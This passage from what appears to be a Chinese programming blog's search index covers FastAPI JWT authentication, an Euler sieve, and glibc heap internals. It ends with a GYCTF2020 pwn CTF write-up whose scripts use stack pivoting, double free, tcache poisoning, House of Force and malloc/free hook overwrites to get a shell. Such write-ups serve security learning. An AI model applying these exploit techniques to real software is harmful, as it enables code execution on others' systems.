HTTPExceptionfrom sqlalchemy.orm import Sessionfrom sqlalchemy.exc import IntegrityErrorfrom . import crudfrom .auth import get_current_user, auth_user, gen_token, hash_passwordfrom .schemas import User, UserCreatefrom ..db import get_dbrouter = APIRouter()# ...@router.post('/')def create(param: UserCreate, db: Session = Depends(get_db)): param.password = hash_password(param.password) try: target = crud.create(db=db, param=param) except IntegrityError: raise HTTPException(status_code=400, detail='Duplicate username') return 0 利用 Depends(get_db) 获取一个数据库 Session，然后借助 crud.create 插入密码被哈希后的用户数据。这里的 hash_password 来源于 auth.py： 123456from passlib.context import CryptContextpwd_context = CryptContext(schemes=['bcrypt'], deprecated='auto')def hash_password(password): return pwd_context.hash(password) 我们采用了 bcrypt 算法进行哈希。同理，验证函数同样简单： 12def verify_password(plain, hashed): return pwd_context.verify(plain, hashed) 登录：验证用户信息对于给定的 username 和 password，我们需要通过数据库查询验证用户名和密码是否合法： 12345678910from sqlalchemy.orm import Sessionfrom . import cruddef auth_user(db: Session, username: str, password: str): user = crud.get(db=db, username=username) if user is None: return False if not verify_password(password, user.password): return False return user 根据 OAuth2 标准，接收用户名和密码时需要使用 application/x-www-form-urlencoded 格式，当用户名或密码错误时返回 401，且返回自定义 HTTP 头 WWW-Authenticate: Bearer，其中 Bearer是我们这里使用的携带 token 的方式： 12345678910from typing import Dictfrom fastapi.security import OAuth2PasswordRequestForm@router.post('/login', response_model=Dict[str, str])def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)): user = auth_user(db, form_data.username, form_data.password) if not user: raise HTTPException( status_code=401, detail='Incorrect username or password', headers={'WWW-Authenticate': 'Bearer'}) # ... 登录：生成 jwt对于给定的数据以及 token 失效时间，借助 python-jose 库，参考 jwt 标准生成 jwt： 123456789101112131415from jose import JWTError, jwtfrom datetime import datetime, timedeltafrom .config import SECRET_KEY, ALGORITHMdef gen_token(data: dict, expires_delta: timedelta = None): to_encode = data.copy() if expires_delta: expire = datetime.utcnow() + expires_delta else: expire = datetime.utcnow() + timedelta(minutes=15) to_encode.update({'exp': expire}) encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM) return encoded_jwt 这里的 data，根据 jwt 标准可以设置 sub 字段为用户的 username，失效时间也可以在程序中自定义： 12345678910111213141516from .config import ACCESS_TOKEN_EXPIRE_MINUTES@router.post('/login', response_model=Dict[str, str])def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)): user = auth_user(db, form_data.username, form_data.password) if not user: raise HTTPException( status_code=401, detail='Incorrect username or password', headers={'WWW-Authenticate': 'Bearer'}) access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES) access_token = gen_token( data={'sub': user.username}, expires_delta=access_token_expires) return { 'access_token': access_token, 'token_type': 'bearer' } 最后根据 OAuth2 标准返回 {access_token, token_type} 对象。 根据 jwt 获取用户信息先通过 jwt.decode 解码信息并验证签名，随后对得到的信息进行解析，最后回到数据库中验证解析后的信息： 12345678910111213141516171819202122from fastapi import Depends, HTTPExceptionfrom fastapi.security import OAuth2PasswordBearerfrom ..db import get_dboauth2_scheme = OAuth2PasswordBearer(tokenUrl='users/login')def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)): credentials_exception = HTTPException( status_code=401, detail='Could not validate credentials', headers={'WWW-Authenticate': 'Bearer'}) try: payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM]) username: str = payload.get('sub') if username is None: raise credentials_exception except JWTError: raise credentials_exception user = crud.get(db=db, username=username) if user is None: raise credentials_exception return user 这里 OAuth2PasswordBearer(tokenUrl='users/login') 实际上和 login 函数的参数 form_data: OAuth2PasswordRequestForm 对应，形成完整的 OAuth2 password flow。 然后在 users.py 中暴露获取当前登陆用户信息的接口： 123@router.get('/', response_model=User)async def get(current_user: User = Depends(get_current_user)): return current_user 测试在 app/ 所在目录运行： 1python3 -m uvicorn app.main:app --reload 随后访问 http://localhost:8000/docs 即可看到 swagger 文档。","link":"/post/FastAPIAuth/"},{"title":"欧拉筛法求素数","text":"我最喜欢的求素数方法。这也是我最常回顾（抄代码）的一篇文章。 C代码123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdbool.h&gt;bool flag[10001] = {0};int p[10001] = {0};int main(){ int i, n, cnt = 0, j; scanf(&quot;%d&quot;, &amp;n); for (i = 2; i &lt;= n; ++i){ if (flag[i] == 0) p[cnt++] = i; for (j = 0; j &lt; cnt &amp;&amp; i * p[j] &lt;= n; ++j){ flag[i * p[j]] = 1; if (i % p[j] == 0) break; } } for (i = 0; i &lt; cnt; ++i) i == cnt - 1 ? printf(&quot;%d\\n&quot;, p[i]) : printf(&quot;%d &quot;, p[i]); return 0;} 说明 flag标记下标是否为合数 p按顺序存放素数 flag[i * p[j]] = 1筛掉i这一素数的素数倍数。 若i能整除p[j]则跳出循环，等到p[j]==i时再筛去i*p[j]这个数。即仅在合数的最大因子作为乘数时筛去这一合数。 时间复杂度O(n) C++版本实现上有所改动。 123456789101112131415161718192021222324252627#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 1e7+5;bool np[maxn]{true,true};vector&lt;int&gt; prime;int main(){ int n, m, x; cin &gt;&gt; n &gt;&gt; m; for (int i = 2; i &lt;= n; ++i) { if (!np[i]) prime.push_back(i); for (int j = 0; j &lt; prime.size() &amp;&amp; i*prime[j] &lt;= n; ++j) { np[i*prime[j]] = true; if (i % prime[j] == 0) break; } } for (int i = 1; i &lt;= m; ++i) { scanf(&quot;%d&quot;, &amp;x); printf(&quot;%s\\n&quot;, np[x] ? &quot;No&quot; : &quot;Yes&quot;); } return 0;}","link":"/post/EulerSieve/"},{"title":"GLibc 堆内存管理机制简介","text":"The heap is a beautiful mess. 本文将对 Glibc 堆上的内存管理作简要介绍，部分内容翻译自参考资料中的文章。略过了许多细节，主要是为了对新手友好。 默认读者熟悉操作系统、C 语言及其运行机制，并且对于 C 中的函数调用栈有所了解。 什么是堆？堆是每个程序被分配到的一块内存区域，和栈的区别主要在于堆内存是动态分配的。也就是说，程序可以从heap段请求一块内存，或者释放一块内存。 另外，堆内存是全局的，即在程序的任意位置都可以访问到堆，并不一定要在调用malloc的那个函数里访问。这是因为 C 语言使用指针指向动态分配的内存。但相比访问栈上的静态局部变量，使用指针也带来了一定的开销。 使用动态分配的内存GLibc 采用 ptmalloc2 内存分配器管理堆内存，相比前身 dlmalloc，它增加了对多线程的支持。多线程的好处就不多赘述了。 借助stdlib.h我们可以使用malloc和free函数来操作堆内存： 123456char *buffer = (char *)malloc(10);strcpy(buffer, &quot;hello&quot;);printf(&quot;%s\\n&quot;, buffer);free(buffer); 第一行分配了 10 字节给buffer，注意这里的强制类型转换是必须的；第 2-3 行使用了buffer这块内存，并在最后一行释放。 下面是malloc和free函数的注释： 1234567891011121314151617181920212223242526/* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t.*//* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint.*/ 注意，即使申请 0 字节内存，malloc依然会分配一个最小的 chunk；如果传给free的参数是空指针，free不会做任何事，而如果传入的是一个已经free过的指针，那么后果是不可预期的。这里尤其需要注意的是，与Java等语言不同，C 语言中释放掉分配到的内存的责任在于程序员，并且分配到的内存只应使用一次。 这两个函数在更底层上是使用brk()和mmap()这两个系统调用来管理内存的。 两个系统调用注意申请内存时，Linux 内核只会先分配一段虚拟内存，真正使用时才会映射到物理内存上去。 brk()brk()通过增加break location来获取内存，一开始heap段的起点start_brk和heap段的终点brk指向同一个位置。 ASLR 关闭时，两者指向 data/bss 段的末尾，也就是end_data ASLR 开启时，两者指向 data/bss 段的末尾加上一段随机 brk 偏移 注：注意与sbrk()的区别，后者是 C 语言库函数，malloc源码中的MORECORE就是调用的sbrk()。 mmap()用于创建私有的匿名映射段，主要是为了分配一块新的内存，且这块内存只有调用mmap()的进程可以使用，所以称之为私有的。与之进行相反操作的是munmap()，删除一块内存区域上的映射。 多线程与 Arena前面提到，ptmalloc2 的一大改进就在于多线程，那么他是如何做到的呢？不难猜到，每个线程必定要维护一些独立的数据结构，并且对这些数据结构的访问是需要加锁的。的确，在 ptmalloc2 中，每个线程拥有自己的freelist，也就是维护空闲内存的一个链表；以及自己的arena，一段连续的堆内存区域。特别地，主线程的arena叫做main_arena。注意只有main_arena可以访问heap段和mmap映射区域，non_main_arena只能访问mmap映射区域。 注：线程较多时，互斥锁机制会导致性能下降。 当我们在程序中第一次申请内存时还没有heap段，因此 132KB 的heap段，也就是我们的main_arena，会被创建（**通过brk()**），无论我们申请的内存是多大。对于接下来的内存申请，malloc都会从main_arena中尝试取出一块内存进行分配。如果空间不够，main_arena可以通过brk()扩张；如果空闲空间太多，也可以缩小。 那么对于non_main_arena呢？前面提到它只能访问mmap映射区域，因为在创建时它就是由mmap()创建的——1MB 的内存空间会被映射到进程地址空间，不过实际上只有 132KB 是可读写的，这 132KB 就是该线程的heap结构，或者叫non_main_arena。 注：当然了，当申请的空间大于 128KB 且arena中没有足够空间时，无论在哪个arena里都只能通过mmap()分配内存。 arena也不是和线程一对一的，实际上有数量限制： 1234For 32 bit systems: Number of arena = 2 * number of cores.For 64 bit systems: Number of arena = 8 * number of cores. 而当我们free一小块内存时，内存也不会直接归还给内核，而是给 ptmalloc2 让他去维护，后者会将空闲内存丢入 bin 中，或者说freelist中也可以。如果过了一会我们的程序又要申请内存，那么 ptmalloc2 就会从 bin 中找一块空闲的内存进行分配，找不到的话才会去问内核要内存。 维护多个堆前面提到，main_arena只有一个堆，并且可以灵活地放缩；non_main_arena则只能通过mmap()获得一个堆。那么如果non_main_arena里分配的堆内存不够了怎么办？很简单，再mmap()一次，创建一个新的堆。 所以，在non_main_arena里，我们必须考虑如何维护多个堆的问题。这里我们会涉及三个头部： heap_info：每个堆的头部，main_arena是没有的 malloc_state：arena的头部，main_arena的这个部分是全局变量而不属于堆段 malloc_chunk：每个 chunk 的头部 具体一点，heap_info完整定义如下： 123456789101112typedef struct _heap_info{ mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];} heap_info; 而malloc_state的完整定义如下： 123456789101112131415161718192021222324252627282930313233343536373839struct malloc_state{ /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;}; 其中INTERNAL_SIZE_T默认和size_t相同： 123#ifndef INTERNAL_SIZE_T#define INTERNAL_SIZE_T size_t#endif 在后面介绍 chunk 和 bin 的时候，我们会发现其中几个字段的作用，malloc_chunk我们也会在后面看到。 对于arena中只有单个堆的情况： 对于non_main_arena中有多个堆的情况： 注意到有多个堆的情况下，旧的堆的 Top chunk 会被认为是普通的空闲块。 Chunk 的结构通俗地说，一块由分配器分配的内存块叫做一个 chunk，包含了元数据和用户数据。具体一点，chunk 完整定义如下： 1234567891011struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;};typedef struct malloc_chunk* mchunkptr; 这里出现的6个字段均为元数据。 一个 chunk 可以是以下几种类型之一： 已分配的（Allocated chunk） 空闲的（Free chunk） Top chunk Last Remainder chunk 我们一个一个来看。 Allocated chunk 第一个部分（32 位上 4B，64 位上 8B）叫做prev_size，只有在前一个 chunk 空闲时才表示前一个块的大小，否则这里就是无效的，可以被前一个块征用（存储用户数据）。 这里的前一个chunk，指内存中相邻的前一个，而不是freelist链表中的前一个。PREV_INUSE代表的“前一个chunk”同理。 第二个部分的高位存储当前 chunk 的大小，低 3 位分别表示： P: PREV_INUSE 之前的 chunk 已经被分配则为 1 M: IS_MMAPED 当前 chunk 是mmap()得到的则为 1 N: NON_MAIN_ARENA 当前 chunk 在non_main_arena里则为 1 对应源码如下： 123456789101112131415161718192021/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */#define PREV_INUSE 0x1/* extract inuse bit of previous chunk */#define prev_inuse(p) ((p)-&gt;size &amp; PREV_INUSE)/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */#define IS_MMAPPED 0x2/* check for mmap()'ed chunk */#define chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */#define NON_MAIN_ARENA 0x4/* check for chunk from non-main arena */#define chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA) 你可能会有几个困惑： fd、bk、fd_nextsize、bk_nextsize这几个字段去哪里了？对于已分配的 chunk 来说它们没用，所以也被征用了，用来存储用户数据。 为什么第二个部分的低 3 位就这么被吞了而不会影响size？这是因为malloc会将用户申请的内存大小转化为实际分配的内存，以此来满足（至少）8字节对齐的要求，同时留出额外空间存放 chunk 头部。由于（至少）8字节对齐了，低3位自然就没用了。在获取真正的size时，会忽略低3位： 123456789101112/* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)/* Get size, ignoring use bits */#define chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS)) malloc是如何将申请的大小转化为实际分配的大小的呢？核心在于request2size宏： 123456/* pad request bytes into a usable size -- internal version */#define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 其中用到的其它宏定义： 1234567891011# define MALLOC_ALIGNMENT (2 *SIZE_SZ)/* The corresponding bit mask value */#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)/* The smallest possible chunk */#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))/* The smallest size we can malloc is an aligned minimal chunk */#define MINSIZE \\ (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)) 这里还有一个mem指针，是做什么用的？这是调用malloc时返回给用户的指针。实际上，真正的chunk 是从chunk指针开始的。 1234567/* The corresponding word size */#define SIZE_SZ (sizeof(INTERNAL_SIZE_T))/* conversion from malloc headers to user pointers, and back */#define chunk2mem(p) ((void*)((char*)(p) + 2*SIZE_SZ))#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ)) 用户申请的内存大小就是用户数据可用的内存大小吗？不一定，原因还是字节对齐问题。要获得可用内存大小，可以用malloc_usable_size()获得，其核心函数是： 123456789101112131415161718static size_tmusable (void *mem){ mchunkptr p; if (mem != 0) { p = mem2chunk (mem); if (__builtin_expect (using_malloc_checking == 1, 0)) return malloc_check_get_size (p); if (chunk_is_mmapped (p)) return chunksize (p) - 2 * SIZE_SZ; else if (inuse (p)) return chunksize (p) - SIZE_SZ; } return 0;} Free chunk 首先，prev_size必定存储上一个块的用户数据，因为 Free chunk 的上一个块必定是 Allocated chunk，否则会发生合并。 接着，多出来的fd指向同一个 bin 中的前一个 Free chunk，bk指向同一个 bin 中的后一个 Free chunk。 这里提到了 bin，我们将在后面介绍。 此外，对于 large bins 中的 Free chunk，fd_nextsize与bk_nextsize会生效，分别指向 large bins 中前一个（更大的）和后一个（更小的）空闲块。 Top chunk一个arena顶部的 chunk 叫做 Top chunk，它不属于任何 bin。当所有 bin 中都没有空闲的可用 chunk 时，我们切割 Top chunk 来满足用户的内存申请。假设 Top chunk 当前大小为 N 字节，用户申请了 K 字节的内存，那么 Top chunk 将被切割为： 一个 K 字节的 chunk，分配给用户 一个 N-K 字节的 chunk，称为 Last Remainder chunk 后者成为新的 Top chunk。如果连 Top chunk 都不够用了，那么： 在main_arena中，用brk()扩张 Top chunk 在non_main_arena中，用mmap()分配新的堆 注：Top chunk 的 PREV_INUSE 位总是 1 Last Remainder chunk当需要分配一个比较小的 K 字节的 chunk 但是 small bins 中找不到满足要求的，且 Last Remainder chunk 的大小 N 能满足要求，那么 Last Remainder chunk 将被切割为： 一个 K 字节的 chunk，分配给用户 一个 N-K 字节的 chunk，成为新的 Last Remainder chunk 它的存在使得连续的小空间内存申请，分配到的内存都是相邻的，从而达到了更好的局部性。 Bin 的结构bin 是实现了空闲链表的数据结构，用来存储空闲 chunk，可分为： 10 个 fast bins，存储在fastbinsY中 1 个 unsorted bin，存储在bin[1] 62 个 small bins，存储在bin[2]至bin[63] 63 个 large bins，存储在bin[64]至bin[126] 还是一个一个来看。 fast bins非常像高速缓存 cache，主要用于提高小内存分配效率。相邻空闲 chunk 不会被合并，这会导致外部碎片增多但是free效率提升。注意 fast bins 是 10 个 LIFO 的单链表。最后三个链表保留未使用。 chunk大小（含chunk头部）：0x10-0x40（64位0x20-0x80）B，相邻bin存放的大小相差0x8（0x10）B。 注：加入 fast bins 的 chunk，它的IN_USE位（准确地说，是下一个 chunk 的PREV_INUSE位）依然是 1。这就是为什么相邻的“空闲”chunk 不会被合并，因为它们根本不会被认为是空闲的。 关于fastbin最大大小，参见宏DEFAULT_MXFAST： 123#ifndef DEFAULT_MXFAST#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)#endif 在初始化时，这个值会被赋值给全局变量global_max_fast。 申请fast chunk时遵循first fit原则。释放一个fast chunk时，首先检查它的大小以及对应fastbin此时的第一个chunk old的大小是否合法，随后它会被插入到对应fastbin的链表头，此时其fd指向old。 unsorted bin非常像缓冲区 buffer，大小超过 fast bins 阈值的 chunk 被释放时会加入到这里，这使得 ptmalloc2 可以复用最近释放的 chunk，从而提升效率。 unsorted bin 是一个双向循环链表，chunk 大小：大于global_max_fast。 当程序申请大于global_max_fast内存时，分配器遍历unsorted bin，每次取最后的一个unsorted chunk。 如果unsorted chunk满足以下四个条件，它就会被切割为一块满足申请大小的chunk和另一块剩下的chunk，前者返回给程序，后者重新回到unsorted bin。 申请大小属于small bin范围 unosrted bin中只有该chunk 这个chunk同样也是last remainder chunk 切割之后的大小依然可以作为一个chunk 否则，从unsorted bin中删除unsorted chunk。 若unsorted chunk恰好和申请大小相同，则直接返回这个chunk 若unsorted chunk属于small bin范围，插入到相应small bin 若unsorted chunk属于large bin范围，则跳转到3。 此时unsorted chunk属于large bin范围。 若对应large bin为空，直接插入unsorted chunk，其fd_nextsize与bk_nextsize指向自身。 否则，跳转到4。 到这一步，我们需按大小降序插入对应large bin。 若对应large bin最后一个chunk大于unsorted chunk，则插入到最后 否则，从对应large bin第一个chunk开始，沿fd_nextsize（即变小）方向遍历，直到找到一个chunk fwd，其大小小于等于unsorted chunk的大小 若fwd大小等于unsorted chunk大小，则插入到fwd后面 否则，插入到fwd前面 直到找到满足要求的unsorted chunk，或无法找到，去top chunk切割为止。 small bins小于 0x200（0x400）B 的 chunk 叫做 small chunk，而 small bins 可以存放的就是这些 small chunks。chunk 大小同样是从 16B 开始每次+8B。 small bins 是 62 个双向循环链表，并且是 FIFO 的，这点和 fast bins 相反。同样相反的是相邻的空闲 chunk 会被合并。 chunk大小：0x10-0x1f0B（0x20-0x3f0），相邻bin存放的大小相差0x8（0x10）B。 释放非fast chunk时，按以下步骤执行： 若前一个相邻chunk空闲，则合并，触发对前一个相邻chunk的unlink操作 若下一个相邻chunk是top chunk，则合并并结束；否则继续执行3 若下一个相邻chunk空闲，则合并，触发对下一个相邻chunk的unlink操作；否则，设置下一个相邻chunk的PREV_INUSE为0 将现在的chunk插入unsorted bin。 若size超过了FASTBIN_CONSOLIDATION_THRESHOLD，则尽可能地合并fastbin中的chunk，放入unsorted bin。若top chunk大小超过了mp_.trim_threshold，则归还部分内存给OS。 12345#ifndef DEFAULT_TRIM_THRESHOLD#define DEFAULT_TRIM_THRESHOLD (128 * 1024)#endif#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) large bins大于等于 0x200（0x400）B 的 chunk 叫做 large chunk，而 large bins 可以存放的就是这些 large chunks。 large bins 是 63 个双向循环链表，插入和删除可以发生在任意位置，相邻空闲 chunk 也会被合并。chunk 大小就比较复杂了： 前 32 个 bins：从 0x200B 开始每次+0x40B 接下来的 16 个 bins：每次+0x200B 接下来的 8 个 bins：每次+0x1000B 接下来的 4 个 bins：每次+0x8000B 接下来的 2 个 bins：每次+0x40000B 最后的 1 个 bin：只有一个 chunk，大小和 large bins 剩余的大小相同 注意同一个 bin 中的 chunks 不是相同大小的，按大小降序排列。这和上面的几种 bins 都不一样。而在取出chunk时，也遵循best fit原则，取出满足大小的最小chunk。 内存分配流程我觉得这类复杂的流程比较需要靠流程图来理解，因此我画了一下： 相关宏： 12345678910111213141516#define NBINS 128#define NSMALLBINS 64#define SMALLBIN_WIDTH MALLOC_ALIGNMENT#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)#define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)#define in_smallbin_range(sz) \\ ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)#ifndef DEFAULT_MMAP_THRESHOLD_MIN#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)#endif#ifndef DEFAULT_MMAP_THRESHOLD#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN#endif 内存释放流程 参考资料 Heap Exploitation Understanding glibc malloc Syscalls used by malloc glibc 内存管理 ptmalloc 源代码分析 Painless intro to the Linux userland heap","link":"/post/GLibcHeap/"},{"title":"GYCTF2020 Pwn","text":"一开始觉得不难的，后来果然不会做了。 模板调整新模板： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *from LibcSearcher import LibcSearcherfrom sys import argvfrom subprocess import check_outputs = lambda data: p.send(str(data))sa = lambda delim,data: p.sendafter(delim,str(data))sl = lambda data: p.sendline(str(data))sla = lambda delim,data: p.sendlineafter(delim,str(data))r = lambda num=4096: p.recv(num)ru = lambda delims,drop=True: p.recvuntil(delims,drop)uu64 = lambda data: u64(data.ljust(8,'\\0'))leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))def leak_libc(func,addr,elf=None): if elf: libc = elf base = addr-libc.sym[func] leak('base',base) system = base+libc.sym['system'] else: libc = LibcSearcher(func,addr) base = addr-libc.dump(func) leak('base',base) system = base+libc.dump('system') return (base,libc,system)context.log_level = 'DEBUG'binary = './pwn'context.binary = binaryelf = ELF(binary,checksec=False)libc_path = '/lib/x86_64-linux-gnu/libc.so.6'#libc_path = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'#env={'LD_PRELOAD':libc_path}libc = ELF(libc_path,checksec=False)one = map(int, check_output(['one_gadget','--raw',libc_path]).split(' '))p = remote('node3.buuoj.cn',20000) if argv[1]=='r' else process(binary)def dbg(): gdb.attach(p) pause()_add,_free,_edit,_show = 1,2,3,4def add(size,content='a'): sla(':',_add) sla(':',size) sa(':',content)def free(index): sla(':',_free) sla(':',index)def edit(index,content): sla(':',_edit) sla(':',index) sa(':',content)def show(index): sla(':',_show) sla(':',index)# start# endp.interactive() borrowstack用leave_ret栈迁移到bss段，需要注意的是栈从高地址向低地址生长，需要留足够的offset确保迁移之后填的payload不会覆盖到下面的got表。我直接把payload长度加起来留了一些余量作为offset，实际上这里的offset甚至可以爆破出来。 1234567891011121314151617leave_ret = 0x400699bank = 0x601080pop_rdi = 0x400703offset = 0xa0payload = flat('a'*0x60,bank+offset,leave_ret)sa('want\\n',payload)payload = flat('a'*offset,bank+offset,pop_rdi,elf.got['puts'],elf.plt['puts'],elf.sym['main'])sa('now!\\n',payload)base = uu64(r(6)) - libc.sym['puts']leak('base',base)one = base + 0x4526apayload = flat('a'*0x60,'a'*8,one)sa('want\\n',payload)sa('now!\\n','a') some_thing_exceting每次申请创建三个堆块，其中一个是结构体指针两个是字符串。而释放时没有置NULL，利用double free就可以修改其中一个字符串chunk的fd指针，指向已经在bss段上的flag。不过对应位置的伪造size字段为0x60，因此为了通过fastbin检查需要使用0x50的字符串chunk。 12345678910flag = 0x6020a8add(0x60,0x50)add(0x60,0x50)add(0x60,0x50)free(0)free(1)free(0)add(0x50,0x50,p64(flag-0x10))add(0x50,0x50)show(1) some_thing_interesting和上题不同的是没有flag在bss段了，但是多出了一个检查code的选项，该函数内存在格式化字符串漏洞。测出偏移为17，泄露libc。 随后，由于本题的edit函数是可以用的，我们不需要double free了，直接uaf就可以修改__malloc_hook为one_gadget了。 123456789101112131415161718code = 'OreOOrereOOreO'sla(':',code+'%17$p')sla(':','0')ru(code)base = int(ru('\\n'),16) - 0x20830leak('base',base)add(0x60,0x60)add(0x60,0x60)free(1)free(2)edit(1,p64(base+libc.sym['__malloc_hook']-0x23))add(0x60,0x60)add(0x60,0x60)edit(4,'a'*0x13+p64(base+0xf1147))sla(':','1')sla(':',str(0x60)) 两道something似乎改编自ACTF2020的两道SCP Foundation。 signin程序分配的块大小固定为0x70，最多申请9个；edit功能只能用一次，不过并没有检查chunk是否是free的；delete检查了chunk是否为free，并且释放之后将chunk对应的flag标记为free，因此无法double free，不过指针依然没有置NULL。 此外还存在后门函数，先calloc(1,0x70)，然后如果全局变量ptr不为空就能getshell。题目环境为Ubuntu 18，那么思路就是利用tcache机制。先填满tcache，随后对tcache中第一个chunk投毒，即修改fd指向ptr上方的fake chunk，然后申请出一块tcache chunk，此时fake chunk就会进入tcache中。再申请一次即可getshell。 1234567891011for i in range(8): add(i)for i in range(8): free(i)dbg()edit(7,p64(0x4040c0-0x10))add(8)dbg()sla('?','6')dbg() force程序没有对申请的大小进行检查，结合题目名可以想到House of Force。先申请一个很大的chunk紧挨着libc，可以泄露出libc。这里的偏移是通过gdb调试得到的，将题目给出的地址和libc_base进行distance即可。随后修改top chunk大小同时泄露堆地址。这样top chunk地址也得到了。 接下来，我使用pwngdb工具，调试的时候先查看heapbase，然后把这个地址作为参数传给force命令，即可得到nb=-48，从而算出evil_size为malloc_hook-top-0x30。申请一个evil_size大小的chunk，然后再申请就能得到__malloc_hook附近的chunk，由于one_gadget条件不满足，这里借用了realloc去覆盖__malloc_hook。 1234567891011121314151617181920distance = 0x5b2010base = add(0x20000)-distanceleak('base',base)heap = add(0x10,'\\x00'*0x18+p64(0xffffffffffffffff))-0x10leak('heap',heap)top = heap+0x20malloc_hook = base+libc.sym['__malloc_hook']one = base+0x4526arealloc = base+libc.sym['realloc']# force heapbaseevil = malloc_hook-top-0x30add(evil)payload = flat('a'*8,one,realloc+4)add(len(payload),payload)sla('puts\\n','1')sla('size\\n',str(0x10)) 需要注意远程的chunk到libc偏移量与本地不同，但是不能通过调试得到。此时可以爆破该偏移，又由于ASLR不改变低12位，只需要步长为0x1000。 bf_note本题关键在于读取title长度时对长度进行了限制，但是后面用的时候依然用的是第一次输入的没有经过限制的长度变量。此外，在读入description和postscript时存在栈溢出。 接下来的步骤对我而言属于新姿势，而原writeup写得挺详细了，建议参考。 document本题存在明显的uaf漏洞，关键在于通过逆向弄清结构体的结构： 12345678910111213 ----------------------- | prev_size | size=0x21 | ------------------------- | ptr | sex=1 || -----------------------| | prev_size | size=0x91 || -------------------------&gt; | name | sex=1 | ----------------------- | | | information | | | ----------------------- 那么我们利用的思路就很简单了，首先由于information所在的chunk固定申请0x80，也就是实际0x90大小，我们可以释放掉一块来泄露libc。然后新申请的0x20堆块都会从从释放的这块中切割，这样只需要在ptr里写入free_hook-0x10，那么在编辑information时，free_hook就落在了图中的information位置，我们写上system即可。 12345678910111213141516add('/bin/sh\\x00') # 0add() # 1add() # 2free(1)show(1)ru('\\n')base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10leak('base',base)free_hook = base+libc.sym['__free_hook']system = base+libc.sym['system']add() # 3add() # 